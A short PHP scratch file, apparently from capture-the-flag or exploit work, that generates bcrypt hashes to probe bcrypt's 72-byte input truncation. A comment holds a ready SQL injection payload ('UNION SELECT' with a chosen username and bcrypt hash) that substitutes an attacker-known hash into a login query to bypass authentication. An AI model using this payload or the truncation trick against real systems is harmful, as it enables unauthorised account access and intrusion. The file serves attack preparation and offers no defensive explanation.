<?php


$data = password_hash(str_repeat("A",71)."i",  PASSWORD_BCRYPT);
echo $data;

// echo var_dump(password_verify(str_repeat("A",71)."i", $data));

// echo str_repeat("A",71);



// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$payload = '$2y$10$FRyJGZCCANAPzknB3DHzO.hFyMm.eDuXwdmk9SBwMco6FOQ6fdIMi';
// 1' UNION SELECT 'xon1l','$2b$04$Dsp.tlFUZHT0WjwJskhdsOdaekJkitj8TNx6AUSDL.7C7AWfJ9fq2' -- -
// $2b$04$Dsp.tlFUZHT0WjwJskhdsOdaekJkitj8TNx6AUSDL.7C7AWfJ9fq2

?>